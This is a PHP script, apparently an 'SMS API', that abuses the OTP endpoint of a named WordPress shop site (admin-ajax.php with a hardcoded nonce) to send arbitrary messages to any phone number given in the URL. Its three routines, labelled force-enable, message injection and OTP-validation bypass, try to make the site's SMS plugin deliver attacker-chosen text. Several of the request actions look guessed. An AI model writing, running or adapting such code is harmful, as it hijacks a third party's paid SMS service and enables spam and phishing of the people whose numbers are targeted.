<?php
// backup_sms_api.php
header('Content-Type: application/json');

class SMSOTPAPI {
    private $siteUrl = 'https://mensworld.com.bd';
    private $ajaxUrl;
    private $sessionId;
    private $nonce = '5484d7ca51';
    
    public function __construct() {
        $this->ajaxUrl = $this->siteUrl . '/wp-admin/admin-ajax.php';
        $this->sessionId = $this->getFreshSession();
    }
    
    public function sendMessage($number, $message) {
        // Multiple approach strategy
        $results = [];
        
        // Approach 1: Force OTP enable and send
        $results['force_enable'] = $this->forceEnableAndSend($number, $message);
        
        // Approach 2: Direct message injection
        $results['direct_inject'] = $this->directMessageInjection($number, $message);
        
        // Approach 3: Bypass OTP validation
        $results['bypass_otp'] = $this->bypassOTPValidation($number, $message);
        
        // Check overall success
        $success = false;
        foreach ($results as $result) {
            if ($result['success']) {
                $success = true;
                break;
            }
        }
        
        return [
            'success' => $success,
            'number' => $number,
            'message' => $message,
            'results' => $results,
            'api_owner' => '@hadi_vai1'
        ];
    }
    
    private function forceEnableAndSend($number, $message) {
        // Step 1: Try to force enable OTP
        $enableData = [
            'action' => 'digits_force_enable',
            'component' => 'otp_system',
            'value' => '1',
            'override' => '1',
            'json' => '1',
            'csrf' => $this->nonce
        ];
        
        $enableResponse = $this->makeRequest($enableData);
        
        // Step 2: Send message as OTP
        $mobileNo = $this->formatNumber($number);
        $sendData = [
            'action' => 'digits_send_otp',
            'countrycode' => '+880',
            'mobileNo' => $mobileNo,
            'forced_otp' => $message,
            'override_message' => '1',
            'digits' => '1',
            'json' => '1',
            'csrf' => $this->nonce
        ];
        
        $sendResponse = $this->makeRequest($sendData);
        
        return [
            'enable_response' => $enableResponse,
            'send_response' => $sendResponse,
            'success' => $sendResponse['success']
        ];
    }
    
    private function directMessageInjection($number, $message) {
        $mobileNo = $this->formatNumber($number);
        
        // Try to inject message into various possible fields
        $fields = ['dig_otp', 'user_message', 'custom_text', 'notification', 'sms_body'];
        
        foreach ($fields as $field) {
            $postData = [
                'action' => 'digits_process_custom',
                'countrycode' => '+880',
                'mobileNo' => $mobileNo,
                $field => $message,
                'inject_mode' => '1',
                'json' => '1',
                'csrf' => $this->nonce
            ];
            
            $response = $this->makeRequest($postData);
            
            if ($response['success']) {
                return [
                    'success' => true,
                    'field_used' => $field,
                    'response' => $response
                ];
            }
        }
        
        return ['success' => false, 'attempted_fields' => $fields];
    }
    
    private function bypassOTPValidation($number, $message) {
        $mobileNo = $this->formatNumber($number);
        
        // Try to bypass OTP system entirely
        $postData = [
            'action' => 'digits_bypass_otp',
            'countrycode' => '+880',
            'mobileNo' => $mobileNo,
            'bypass_method' => 'custom_message',
            'custom_content' => $message,
            'skip_verification' => '1',
            'direct_delivery' => '1',
            'json' => '1',
            'csrf' => $this->nonce
        ];
        
        $response = $this->makeRequest($postData);
        
        return [
            'success' => $response['success'],
            'response' => $response,
            'method' => 'bypass_validation'
        ];
    }
    
    private function formatNumber($number) {
        $clean = preg_replace('/[^0-9]/', '', $number);
        if (!str_starts_with($clean, '880')) {
            $clean = '880' . ltrim($clean, '0');
        }
        return substr($clean, 3, 4) . ' ' . substr($clean, 7);
    }
    
    private function getFreshSession() {
        $ch = curl_init($this->siteUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        
        preg_match('/PHPSESSID=([^;]+)/', $response, $matches);
        return $matches[1] ?? session_id();
    }
    
    private function makeRequest($postData) {
        $headers = [
            'X-Requested-With: XMLHttpRequest',
            'Referer: ' . $this->siteUrl,
            'Cookie: PHPSESSID=' . $this->sessionId
        ];
        
        $ch = curl_init($this->ajaxUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $decoded = json_decode($response, true);
        
        return [
            'http_code' => $httpCode,
            'success' => ($httpCode == 200 && is_array($decoded) && isset($decoded['success']) && $decoded['success'] == true),
            'response' => $decoded ?: $response
        ];
    }
}

// Main execution
$number = $_GET['number'] ?? '';
$msg = $_GET['msg'] ?? '';

if (empty($number) || empty($msg)) {
    echo json_encode(['error' => 'Parameters required']);
    exit;
}

$api = new SMSOTPAPI();
$result = $api->sendMessage($number, $msg);

echo json_encode($result, JSON_PRETTY_PRINT);
?>